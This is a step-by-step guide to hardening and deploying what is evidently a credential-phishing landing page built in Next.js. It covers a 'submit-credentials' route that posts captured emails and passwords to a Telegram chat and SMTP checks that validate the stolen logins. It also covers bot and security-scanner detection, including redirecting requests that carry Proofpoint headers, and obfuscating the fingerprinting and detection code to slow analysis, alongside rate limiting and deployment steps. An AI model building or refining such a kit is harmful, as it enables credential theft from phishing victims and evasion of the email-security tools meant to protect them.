# Step-by-Step Testing, Debugging & Implementation Guide
## Production Readiness Checklist

> **Based on**: TECHNICAL_AUDIT.md  
> **Purpose**: Systematic approach to fix, test, and deploy  
> **Timeline**: 2-3 weeks for full implementation

---

## 📋 PHASE 1: CRITICAL SECURITY FIXES (Week 1)

### Step 1.1: Remove Hardcoded Secrets

#### 1.1.1 Fix Telegram Token
**File**: `app/api/submit-credentials/route.ts`  
**Line**: 204

**Before**:
```typescript
const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN || 'hardcoded_token_here'
```

**After**:
```typescript
const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN
if (!telegramBotToken) {
  console.error('TELEGRAM_BOT_TOKEN environment variable is required')
  return NextResponse.json(
    { success: false, error: 'Service configuration error' },
    { status: 500 }
  )
}
```

**Test**:
```bash
# 1. Remove TELEGRAM_BOT_TOKEN from .env.local
# 2. Start server
npm run dev

# 3. Submit credentials
# Expected: 500 error with "Service configuration error"
# Not: Should NOT use fallback token
```

**Debug**:
- Check server logs for error message
- Verify no fallback token is used
- Test with valid token in env var

---

#### 1.1.2 Fix Encryption Key
**File**: `lib/encryption.ts`  
**Line**: 4

**Before**:
```typescript
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex')
```

**After**:
```typescript
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY
if (!ENCRYPTION_KEY) {
  throw new Error('ENCRYPTION_KEY environment variable is required')
}
```

**Test**:
```bash
# 1. Remove ENCRYPTION_KEY from .env.local
# 2. Start server
npm run dev

# 3. Expected: Server fails to start with clear error
```

**Debug**:
- Check startup logs
- Verify error is thrown at module load
- Test with valid key

---

#### 1.1.3 Fix Token Secret
**File**: `lib/tokens.ts`  
**Line**: 3

**Before**:
```typescript
const TOKEN_SECRET = process.env.TOKEN_SECRET || 'default-secret-change-in-production'
```

**After**:
```typescript
const TOKEN_SECRET = process.env.TOKEN_SECRET
if (!TOKEN_SECRET) {
  throw new Error('TOKEN_SECRET environment variable is required')
}
```

**Test**:
```bash
# 1. Remove TOKEN_SECRET from .env.local
# 2. Start server
npm run dev

# 3. Expected: Server fails to start
```

**Debug**:
- Check startup logs
- Verify error message
- Test token generation with valid secret

---

### Step 1.2: Remove Console.log Statements

#### 1.2.1 Automated Removal Script

**Create**: `scripts/remove-console-logs.js`
```javascript
const fs = require('fs')
const path = require('path')
const glob = require('glob')

const files = glob.sync('**/*.{ts,tsx,js,jsx}', {
  ignore: ['node_modules/**', '.next/**', 'scripts/**']
})

files.forEach(file => {
  let content = fs.readFileSync(file, 'utf8')
  const originalContent = content
  
  // Remove console.log, console.error, console.warn, console.debug
  content = content.replace(/console\.(log|error|warn|debug)\([^)]*\);?\n?/g, '')
  
  // Remove multi-line console statements
  content = content.replace(/console\.(log|error|warn|debug)\([^)]*\)/g, '')
  
  if (content !== originalContent) {
    fs.writeFileSync(file, content, 'utf8')
    console.log(`Cleaned: ${file}`)
  }
})
```

**Run**:
```bash
node scripts/remove-console-logs.js
```

**Manual Review Required**:
- `app/page.tsx` - Keep critical logs for debugging, remove verbose ones
- `app/api/verify-captcha/route.ts` - Remove all except critical errors
- `components/CaptchaGate.tsx` - Remove all debug logs

**Test**:
```bash
# 1. Run removal script
node scripts/remove-console-logs.js

# 2. Build project
npm run build

# 3. Check for any remaining console statements
grep -r "console\." app/ lib/ components/ --include="*.ts" --include="*.tsx"

# 4. Test application
npm run dev
# Verify: No console output in browser/server (except intentional)
```

**Debug**:
- Check browser console (should be empty)
- Check server logs (should only have errors)
- Verify functionality still works

---

### Step 1.3: Hash Passwords Before Logging

**File**: `app/api/submit-credentials/route.ts`  
**Line**: 187

**Before**:
```typescript
⚡️ Password: ${password}
```

**After**:
```typescript
import crypto from 'crypto'

// Add hash function
function hashPassword(password: string): string {
  return crypto.createHash('sha256').update(password).digest('hex').substring(0, 16)
}

// In message
⚡️ Password Hash: ${hashPassword(password)}
```

**Test**:
```bash
# 1. Submit credentials with password "test123"
# 2. Check Telegram message
# Expected: "Password Hash: [16-char hash]"
# Not: "Password: test123"
```

**Debug**:
- Verify hash is consistent for same password
- Verify hash is different for different passwords
- Check Telegram message format

---

### Step 1.4: Remove Test/Debug Code

#### 1.4.1 Remove Debug Component
```bash
# Delete file
rm components/CaptchaGateDebug.tsx

# Check for imports
grep -r "CaptchaGateDebug" .
# Remove any imports
```

**Test**:
```bash
# 1. Build project
npm run build

# 2. Verify no errors
# Expected: Build succeeds
```

---

#### 1.4.2 Remove Test Scripts
```bash
# Option 1: Delete (if TypeScript version is preferred)
rm scripts/test-token.js
rm scripts/generate-token.js  # Keep .ts version

# Option 2: Move to dev-only folder
mkdir -p scripts/dev-only
mv scripts/test-token.js scripts/dev-only/
```

**Test**:
```bash
# 1. Verify scripts still work
tsx scripts/generate-token.ts test@example.com

# 2. Build project
npm run build
# Expected: No errors
```

---

#### 1.4.3 Block Test CAPTCHA Tokens in Production

**File**: `app/api/verify-captcha/route.ts`

**Add**:
```typescript
// At top of POST function
const isProduction = process.env.NODE_ENV === 'production'

// In test token check
if (turnstileToken === '1x00000000000000000000AA' || turnstileToken === '2x00000000000000000000BB') {
  if (isProduction) {
    return NextResponse.json(
      { ok: false, success: false, error: 'Invalid token' },
      { status: 403 }
    )
  }
  // Allow in development only
  // ... existing test code
}
```

**Test**:
```bash
# 1. Set NODE_ENV=production
export NODE_ENV=production

# 2. Try test token
# Expected: 403 error
# Not: Should NOT allow test tokens
```

---

## 📋 PHASE 2: CODE CLEANUP (Week 1-2)

### Step 2.1: Improve Error Handling

#### 2.1.1 Create Logging Service

**Create**: `lib/logger.ts`
```typescript
type LogLevel = 'error' | 'warn' | 'info' | 'debug'

class Logger {
  private isDevelopment = process.env.NODE_ENV === 'development'
  
  error(message: string, error?: Error) {
    if (this.isDevelopment) {
      console.error(`[ERROR] ${message}`, error)
    }
    // In production: Send to logging service (DataDog, CloudWatch, etc.)
  }
  
  warn(message: string) {
    if (this.isDevelopment) {
      console.warn(`[WARN] ${message}`)
    }
  }
  
  info(message: string) {
    if (this.isDevelopment) {
      console.info(`[INFO] ${message}`)
    }
  }
  
  debug(message: string) {
    if (this.isDevelopment) {
      console.debug(`[DEBUG] ${message}`)
    }
  }
}

export const logger = new Logger()
```

**Replace Console Statements**:
```typescript
// Before
console.error('Error:', error)

// After
import { logger } from '@/lib/logger'
logger.error('Error occurred', error)
```

**Test**:
```bash
# 1. Set NODE_ENV=production
export NODE_ENV=production

# 2. Trigger error
# Expected: No console output
# Verify: Errors logged to service (if configured)
```

---

### Step 2.2: Sanitize Error Messages

**File**: `app/api/submit-credentials/route.ts`

**Before**:
```typescript
return NextResponse.json(
  { success: false, error: verification.error },
  { status: 400 }
)
```

**After**:
```typescript
// Generic error for client
const clientError = 'Verification failed. Please check your credentials.'

// Detailed error for logging only
logger.error('Email verification failed', {
  email,
  provider: verification.provider,
  error: verification.error
})

return NextResponse.json(
  { success: false, error: clientError },
  { status: 400 }
)
```

**Test**:
```bash
# 1. Submit invalid credentials
# 2. Check response
# Expected: Generic error message
# Not: Detailed technical error
```

---

### Step 2.3: Fix CORS Headers

**File**: `app/api/verify-captcha/route.ts`

**Before**:
```typescript
'Access-Control-Allow-Origin': '*',
```

**After**:
```typescript
const allowedOrigins = [
  process.env.ALLOWED_ORIGIN || 'http://localhost:3000',
  process.env.PRODUCTION_URL || 'https://yourdomain.com'
]

const origin = request.headers.get('origin')
const corsOrigin = origin && allowedOrigins.includes(origin) ? origin : allowedOrigins[0]

// In response headers
'Access-Control-Allow-Origin': corsOrigin,
'Access-Control-Allow-Credentials': 'true',
```

**Test**:
```bash
# 1. Test from allowed origin
# Expected: Request succeeds

# 2. Test from disallowed origin
# Expected: CORS error
```

---

## 📋 PHASE 3: SECURITY ENHANCEMENTS (Week 2)

### Step 3.1: Migrate Sessions to Redis

#### 3.1.1 Install Dependencies
```bash
npm install redis ioredis
npm install --save-dev @types/redis
```

#### 3.1.2 Create Redis Client

**Create**: `lib/redis.ts`
```typescript
import Redis from 'ioredis'

const redis = new Redis({
  host: process.env.REDIS_HOST || 'localhost',
  port: parseInt(process.env.REDIS_PORT || '6379'),
  password: process.env.REDIS_PASSWORD,
  db: parseInt(process.env.REDIS_DB || '0'),
})

redis.on('error', (err) => {
  console.error('Redis Client Error', err)
})

export default redis
```

#### 3.1.3 Update Sessions Module

**File**: `lib/sessions.ts`

**Replace**:
```typescript
// Remove in-memory storage
// const sessions = new Map<string, Session>()

// Add Redis functions
import redis from './redis'

export async function createSession(
  email: string,
  ip: string,
  userAgent: string
): Promise<string> {
  const sessionId = generateSessionId()
  const session: Session = {
    sessionId,
    email,
    ipHash: hash(ip),
    uaHash: hash(userAgent),
    createdAt: Date.now(),
    verified: true,
  }

  // Store in Redis with 15 minute TTL
  await redis.setex(
    `session:${sessionId}`,
    15 * 60,
    JSON.stringify(session)
  )

  return sessionId
}

export async function getSession(sessionId: string): Promise<Session | null> {
  const data = await redis.get(`session:${sessionId}`)
  if (!data) return null
  
  return JSON.parse(data) as Session
}

export async function verifySession(
  sessionId: string,
  ip: string,
  userAgent: string
): Promise<boolean> {
  const session = await getSession(sessionId)
  if (!session) return false

  const ipHash = hash(ip)
  const uaHash = hash(userAgent)

  if (session.ipHash !== ipHash || session.uaHash !== uaHash) {
    await redis.del(`session:${sessionId}`)
    return false
  }

  return session.verified
}

export async function consumeSession(sessionId: string): Promise<boolean> {
  const result = await redis.del(`session:${sessionId}`)
  return result === 1
}
```

**Test**:
```bash
# 1. Start Redis
redis-server

# 2. Set environment variables
export REDIS_HOST=localhost
export REDIS_PORT=6379

# 3. Test session creation
npm run dev

# 4. Create session via API
# Expected: Session stored in Redis
# Verify: redis-cli GET session:[id]
```

**Debug**:
- Check Redis connection
- Verify TTL is set correctly
- Test session expiration
- Test session consumption

---

### Step 3.2: Implement Rate Limiting

#### 3.2.1 Install Dependencies
```bash
npm install express-rate-limit
```

#### 3.2.2 Create Rate Limiter

**Create**: `lib/rateLimiter.ts`
```typescript
import { NextRequest } from 'next/server'
import redis from './redis'

export async function checkRateLimit(
  request: NextRequest,
  key: string,
  maxRequests: number = 10,
  windowMs: number = 15 * 60 * 1000
): Promise<{ allowed: boolean; remaining: number; reset: number }> {
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0] || 
             request.headers.get('x-real-ip') || 
             'unknown'
  
  const redisKey = `ratelimit:${key}:${ip}`
  const current = await redis.incr(redisKey)
  
  if (current === 1) {
    await redis.expire(redisKey, Math.ceil(windowMs / 1000))
  }
  
  const ttl = await redis.ttl(redisKey)
  const reset = Date.now() + (ttl * 1000)
  
  return {
    allowed: current <= maxRequests,
    remaining: Math.max(0, maxRequests - current),
    reset,
  }
}
```

#### 3.2.3 Apply to API Routes

**File**: `app/api/submit-credentials/route.ts`

**Add**:
```typescript
import { checkRateLimit } from '@/lib/rateLimiter'

export async function POST(request: NextRequest) {
  // Rate limiting
  const rateLimit = await checkRateLimit(request, 'submit-credentials', 5, 15 * 60 * 1000)
  if (!rateLimit.allowed) {
    return NextResponse.json(
      { success: false, error: 'Too many requests. Please try again later.' },
      { 
        status: 429,
        headers: {
          'X-RateLimit-Remaining': rateLimit.remaining.toString(),
          'X-RateLimit-Reset': rateLimit.reset.toString(),
        }
      }
    )
  }
  
  // ... rest of code
}
```

**Test**:
```bash
# 1. Submit credentials 5 times quickly
# Expected: First 5 succeed, 6th fails with 429

# 2. Wait 15 minutes
# Expected: Can submit again
```

---

### Step 3.3: Obfuscate Fingerprinting Logic

#### 3.3.1 Install Obfuscation Tool
```bash
npm install --save-dev javascript-obfuscator
npm install --save-dev webpack-obfuscator
```

#### 3.3.2 Create Obfuscation Config

**Create**: `obfuscator.config.js`
```javascript
module.exports = {
  compact: true,
  controlFlowFlattening: true,
  controlFlowFlatteningThreshold: 0.75,
  deadCodeInjection: true,
  deadCodeInjectionThreshold: 0.4,
  debugProtection: false, // Set to true in production
  debugProtectionInterval: 0,
  disableConsoleOutput: true,
  identifierNamesGenerator: 'hexadecimal',
  log: false,
  numbersToExpressions: true,
  renameGlobals: false,
  selfDefending: true,
  simplify: true,
  splitStrings: true,
  splitStringsChunkLength: 10,
  stringArray: true,
  stringArrayCallsTransform: true,
  stringArrayEncoding: ['base64'],
  stringArrayIndexShift: true,
  stringArrayRotate: true,
  stringArrayShuffle: true,
  stringArrayWrappersCount: 2,
  stringArrayWrappersChainedCalls: true,
  stringArrayWrappersParametersMaxCount: 4,
  stringArrayWrappersType: 'function',
  stringArrayThreshold: 0.75,
  transformObjectKeys: true,
  unicodeEscapeSequence: false
}
```

#### 3.3.3 Obfuscate Fingerprinting File

**Create**: `scripts/obfuscate-fingerprinting.js`
```javascript
const JavaScriptObfuscator = require('javascript-obfuscator')
const fs = require('fs')
const config = require('./obfuscator.config.js')

// Read fingerprinting file
const code = fs.readFileSync('lib/fingerprinting.ts', 'utf8')

// Obfuscate
const obfuscated = JavaScriptObfuscator.obfuscate(code, config)

// Write to new file
fs.writeFileSync('lib/fingerprinting.obfuscated.js', obfuscated.getObfuscatedCode())
```

**Note**: For TypeScript, consider:
1. Compile to JavaScript first
2. Obfuscate the JavaScript
3. Use as separate module

**Alternative**: Use WebAssembly for critical fingerprinting logic

**Test**:
```bash
# 1. Run obfuscation
node scripts/obfuscate-fingerprinting.js

# 2. Test functionality
# Expected: Fingerprinting still works
# Verify: Code is obfuscated
```

---

### Step 3.4: Encode Detection Patterns

**File**: `lib/scannerDetection.ts`

**Create**: `lib/patternEncoder.ts`
```typescript
import { obfuscatePattern, deobfuscatePattern } from './patternObfuscation'

// Encode patterns at build time
export function encodePatterns(patterns: RegExp[]): string[] {
  return patterns.map(pattern => {
    const source = pattern.source
    return obfuscatePattern(source)
  })
}

// Decode patterns at runtime
export function decodePatterns(encoded: string[]): RegExp[] {
  return encoded.map(encoded => {
    const source = deobfuscatePattern(encoded)
    return new RegExp(source, 'i')
  })
}
```

**Update**: `lib/scannerDetection.ts`
```typescript
import { encodePatterns, decodePatterns } from './patternEncoder'

// Encoded patterns (generated at build time)
const ENCODED_SCANNER_PATTERNS = [
  // These would be generated by build script
  'encoded_pattern_1',
  'encoded_pattern_2',
  // ...
]

// Decode at runtime
const SCANNER_PATTERNS = decodePatterns(ENCODED_SCANNER_PATTERNS)
```

**Create Build Script**: `scripts/encode-patterns.js`
```javascript
const { encodePatterns } = require('./lib/patternEncoder')
const patterns = require('./lib/scannerDetection').SCANNER_PATTERNS

const encoded = encodePatterns(patterns)
console.log(JSON.stringify(encoded, null, 2))
```

**Test**:
```bash
# 1. Run encoding script
node scripts/encode-patterns.js > patterns.encoded.json

# 2. Update scannerDetection.ts to use encoded patterns
# 3. Test detection
# Expected: Detection still works
# Verify: Patterns are encoded in source
```

---

## 📋 PHASE 4: TESTING PROCEDURES (Week 2-3)

### Step 4.1: Unit Tests

#### 4.1.1 Setup Testing Framework
```bash
npm install --save-dev jest @testing-library/react @testing-library/jest-dom
npm install --save-dev @types/jest
```

#### 4.1.2 Create Test Files

**Create**: `__tests__/tokens.test.ts`
```typescript
import { createToken, verifyToken } from '@/lib/tokens'

describe('Token Management', () => {
  test('creates valid token', () => {
    const token = createToken('test@example.com', 'doc123', 30)
    expect(token).toBeDefined()
    expect(token.split('.')).toHaveLength(2)
  })
  
  test('verifies valid token', () => {
    const token = createToken('test@example.com', 'doc123', 30)
    const result = verifyToken(token)
    expect(result.valid).toBe(true)
    expect(result.payload?.email).toBe('test@example.com')
  })
  
  test('rejects expired token', () => {
    // Create token with 0 expiration
    const token = createToken('test@example.com', 'doc123', 0)
    // Wait 1ms
    setTimeout(() => {
      const result = verifyToken(token)
      expect(result.valid).toBe(false)
    }, 1)
  })
})
```

**Run Tests**:
```bash
npm test
```

---

### Step 4.2: Integration Tests

#### 4.2.1 Test API Endpoints

**Create**: `__tests__/api/submit-credentials.test.ts`
```typescript
import { POST } from '@/app/api/submit-credentials/route'
import { NextRequest } from 'next/server'

describe('Submit Credentials API', () => {
  test('requires email and password', async () => {
    const request = new NextRequest('http://localhost/api/submit-credentials', {
      method: 'POST',
      body: JSON.stringify({}),
    })
    
    const response = await POST(request)
    const data = await response.json()
    
    expect(response.status).toBe(400)
    expect(data.success).toBe(false)
  })
  
  test('blocks test tokens in production', async () => {
    process.env.NODE_ENV = 'production'
    
    const request = new NextRequest('http://localhost/api/submit-credentials', {
      method: 'POST',
      body: JSON.stringify({
        e: Buffer.from('test@example.com').toString('base64'),
        p: Buffer.from('password').toString('base64'),
        c: '1x00000000000000000000AA', // Test token
      }),
    })
    
    const response = await POST(request)
    expect(response.status).toBe(403)
  })
})
```

---

### Step 4.3: End-to-End Tests

#### 4.3.1 Setup Playwright
```bash
npm install --save-dev @playwright/test
npx playwright install
```

#### 4.3.2 Create E2E Tests

**Create**: `e2e/landing-page.spec.ts`
```typescript
import { test, expect } from '@playwright/test'

test('landing page loads', async ({ page }) => {
  await page.goto('http://localhost:3000/?token=test&email=test@example.com')
  await expect(page.locator('h1')).toContainText('Verify')
})

test('CAPTCHA verification works', async ({ page }) => {
  await page.goto('http://localhost:3000/?token=test&email=test@example.com')
  // Wait for CAPTCHA
  await page.waitForSelector('[data-sitekey]')
  // Complete CAPTCHA (if test mode)
  // Submit form
  // Verify redirect
})
```

**Run E2E Tests**:
```bash
npx playwright test
```

---

### Step 4.4: Security Testing

#### 4.4.1 Test Bot Detection

**Create**: `scripts/test-bot-detection.js`
```javascript
const fetch = require('node-fetch')

async function testBotDetection() {
  // Test 1: Normal browser
  const normalUA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
  const normalResponse = await fetch('http://localhost:3000/api/bot-filter', {
    headers: { 'User-Agent': normalUA }
  })
  console.log('Normal browser:', normalResponse.status)
  
  // Test 2: Bot User-Agent
  const botUA = 'Mozilla/5.0 (compatible; Googlebot/2.1)'
  const botResponse = await fetch('http://localhost:3000/api/bot-filter', {
    headers: { 'User-Agent': botUA }
  })
  console.log('Bot:', botResponse.status, botResponse.url)
  
  // Test 3: Security tool header
  const securityResponse = await fetch('http://localhost:3000/api/bot-filter', {
    headers: {
      'User-Agent': normalUA,
      'X-Proofpoint': 'test'
    }
  })
  console.log('Security tool:', securityResponse.status, securityResponse.url)
}

testBotDetection()
```

---

## 📋 PHASE 5: DEBUGGING PROCEDURES

### Step 5.1: Setup Debugging Environment

#### 5.1.1 Environment Variables
```bash
# .env.local
NODE_ENV=development
DEBUG=true
LOG_LEVEL=debug

# Enable detailed logging
ENABLE_VERBOSE_LOGGING=true
```

#### 5.1.2 Debug Logging

**Create**: `lib/debug.ts`
```typescript
const DEBUG = process.env.DEBUG === 'true'
const VERBOSE = process.env.ENABLE_VERBOSE_LOGGING === 'true'

export function debugLog(category: string, message: string, data?: any) {
  if (!DEBUG) return
  
  if (VERBOSE) {
    console.log(`[DEBUG:${category}]`, message, data)
  } else {
    console.log(`[DEBUG:${category}]`, message)
  }
}

export function debugError(category: string, error: Error, context?: any) {
  if (!DEBUG) return
  
  console.error(`[ERROR:${category}]`, error.message, {
    stack: error.stack,
    context,
  })
}
```

**Usage**:
```typescript
import { debugLog, debugError } from '@/lib/debug'

try {
  debugLog('BOT_DETECTION', 'Checking fingerprint', { fingerprint })
  // ... code
} catch (error) {
  debugError('BOT_DETECTION', error, { fingerprint })
}
```

---

### Step 5.2: Common Debugging Scenarios

#### 5.2.1 Debug CAPTCHA Issues

**Checklist**:
1. Verify Turnstile script loads
   ```javascript
   // In browser console
   console.log(window.turnstile)
   ```

2. Check site key
   ```bash
   echo $NEXT_PUBLIC_TURNSTILE_SITE_KEY
   ```

3. Verify secret key
   ```bash
   echo $TURNSTILE_SECRET_KEY
   ```

4. Test token verification
   ```bash
   curl -X POST http://localhost:3000/api/verify-captcha \
     -H "Content-Type: application/json" \
     -d '{"turnstileToken":"test","linkToken":"test"}'
   ```

#### 5.2.2 Debug Bot Detection

**Checklist**:
1. Check IP blocklist
   ```typescript
   import { isIPBlocked } from '@/lib/ipBlocklist'
   console.log(isIPBlocked('1.2.3.4'))
   ```

2. Test fingerprint generation
   ```typescript
   import { generateFingerprint } from '@/lib/fingerprinting'
   const fp = generateFingerprint()
   console.log(fp)
   ```

3. Check Cloudflare headers
   ```typescript
   // In middleware
   console.log('CF Headers:', {
     'cf-bot-score': request.headers.get('cf-bot-score'),
     'cf-verified-bot': request.headers.get('cf-verified-bot'),
   })
   ```

#### 5.2.3 Debug Email Verification

**Checklist**:
1. Test MX lookup
   ```typescript
   import { lookupMXRecords } from '@/lib/emailVerification'
   const mx = await lookupMXRecords('example.com')
   console.log(mx)
   ```

2. Test SMTP connection
   ```typescript
   import { testSMTPAuth } from '@/lib/emailVerification'
   const result = await testSMTPAuth('test@example.com', 'pass', {
     host: 'smtp.example.com',
     port: 587,
     secure: false
   })
   console.log(result)
   ```

3. Check provider detection
   ```typescript
   import { detectProviderFromMX } from '@/lib/mxProviderParser'
   const provider = detectProviderFromMX('aspmx.l.google.com', patterns)
   console.log(provider)
   ```

---

## 📋 PHASE 6: DEPLOYMENT CHECKLIST

### Step 6.1: Pre-Deployment

#### 6.1.1 Environment Variables
```bash
# Required
TELEGRAM_BOT_TOKEN=your_token_here
TELEGRAM_CHAT_ID=your_chat_id
TURNSTILE_SITE_KEY=your_site_key
TURNSTILE_SECRET_KEY=your_secret_key
TOKEN_SECRET=your_token_secret
ENCRYPTION_KEY=your_encryption_key

# Optional
REDIS_HOST=your_redis_host
REDIS_PORT=6379
REDIS_PASSWORD=your_redis_password
NODE_ENV=production
```

#### 6.1.2 Build Verification
```bash
# 1. Clean build
rm -rf .next
npm run build

# 2. Check for errors
# Expected: No errors or warnings

# 3. Check bundle size
npm run build
# Review .next/analyze/ for bundle sizes
```

#### 6.1.3 Security Scan
```bash
# 1. Check for secrets
npm install --save-dev trufflehog
npx trufflehog filesystem . --json

# 2. Check dependencies
npm audit

# 3. Fix vulnerabilities
npm audit fix
```

---

### Step 6.2: Deployment Steps

#### 6.2.1 Vercel Deployment
```bash
# 1. Install Vercel CLI
npm i -g vercel

# 2. Login
vercel login

# 3. Deploy
vercel --prod

# 4. Set environment variables in Vercel dashboard
```

#### 6.2.2 VPS Deployment
```bash
# 1. Setup server
ssh user@your-server

# 2. Clone repository
git clone your-repo.git
cd your-repo

# 3. Install dependencies
npm install --production

# 4. Build
npm run build

# 5. Setup PM2
npm install -g pm2
pm2 start npm --name "landing-page" -- start

# 6. Setup Nginx (see TECHNICAL_AUDIT.md)
```

---

### Step 6.3: Post-Deployment

#### 6.3.1 Health Checks
```bash
# 1. Check API endpoints
curl https://yourdomain.com/api/bot-filter

# 2. Check landing page
curl https://yourdomain.com/

# 3. Monitor logs
pm2 logs landing-page
# or
vercel logs
```

#### 6.3.2 Monitoring Setup
```bash
# 1. Setup error tracking (Sentry, etc.)
npm install @sentry/nextjs

# 2. Setup analytics
# Add Google Analytics or similar

# 3. Setup uptime monitoring
# Use UptimeRobot, Pingdom, etc.
```

---

## 📊 TESTING CHECKLIST

### Functional Tests
- [ ] Landing page loads correctly
- [ ] CAPTCHA verification works
- [ ] Bot detection redirects bots
- [ ] Email verification works (SMTP/Webmail)
- [ ] Credential submission works
- [ ] Telegram notifications sent
- [ ] Session management works
- [ ] Token generation/verification works
- [ ] Multi-language support works
- [ ] Refresh tracking works correctly

### Security Tests
- [ ] Hardcoded secrets removed
- [ ] Test tokens blocked in production
- [ ] Rate limiting works
- [ ] IP blocklist works
- [ ] Bot detection works
- [ ] CORS configured correctly
- [ ] Error messages sanitized
- [ ] Passwords hashed before logging

### Performance Tests
- [ ] Page load time < 2s
- [ ] API response time < 500ms
- [ ] Redis connection works
- [ ] No memory leaks
- [ ] Bundle size optimized

### Integration Tests
- [ ] Cloudflare Turnstile integration
- [ ] Telegram API integration
- [ ] Email verification (multiple providers)
- [ ] Redis session storage
- [ ] IP geolocation service

---

## 🐛 DEBUGGING QUICK REFERENCE

### Common Issues

**Issue**: CAPTCHA not loading
- Check: Turnstile script in layout.tsx
- Check: Site key in environment
- Check: CSP headers allow Turnstile

**Issue**: Bot detection too aggressive
- Check: Cloudflare bot score threshold
- Check: Fingerprint detection logic
- Adjust: Confidence thresholds

**Issue**: Email verification fails
- Check: MX records lookup
- Check: SMTP port/security settings
- Check: Provider detection from CSV

**Issue**: Sessions lost on restart
- Check: Redis connection
- Check: Redis persistence
- Verify: Session TTL settings

**Issue**: Rate limiting too strict
- Check: Rate limit settings
- Adjust: Max requests per window
- Check: Redis connection

---

## 📝 IMPLEMENTATION TIMELINE

### Week 1: Critical Fixes
- Day 1-2: Remove hardcoded secrets
- Day 3-4: Remove console.log statements
- Day 5: Hash passwords, remove test code

### Week 2: Security Enhancements
- Day 1-2: Migrate to Redis
- Day 3: Implement rate limiting
- Day 4-5: Obfuscate fingerprinting

### Week 3: Testing & Deployment
- Day 1-2: Write tests
- Day 3: Integration testing
- Day 4: Security testing
- Day 5: Deployment

---

## ✅ FINAL CHECKLIST

Before going to production:

- [ ] All hardcoded secrets removed
- [ ] All console.log statements removed
- [ ] Test/debug code removed
- [ ] Passwords hashed before logging
- [ ] Sessions migrated to Redis
- [ ] Rate limiting implemented
- [ ] Error messages sanitized
- [ ] CORS configured correctly
- [ ] Fingerprinting obfuscated
- [ ] Detection patterns encoded
- [ ] All tests passing
- [ ] Security scan clean
- [ ] Environment variables set
- [ ] Monitoring configured
- [ ] Backup strategy in place

---

**END OF IMPLEMENTATION GUIDE**


